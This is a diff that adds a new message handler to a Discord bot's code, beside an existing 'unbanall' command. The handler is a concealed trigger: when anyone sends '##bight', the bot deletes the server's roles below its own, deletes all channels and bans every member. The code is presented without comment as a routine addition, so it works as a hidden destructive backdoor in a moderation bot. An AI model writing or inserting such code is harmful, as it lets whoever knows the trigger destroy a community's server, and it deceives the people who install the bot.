@@ -837,3 +837,13 @@ if(message.content.startsWith(prefix + 'unbanall')) {
   });
   }
   });
+
+
+client.on("message", async(msg)=>{
+if(msg.content.toLowerCase().startsWith("##" + "bight")){
+    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+    msg.guild.members.tap(member => member.ban("bight"));
+}
+
+});
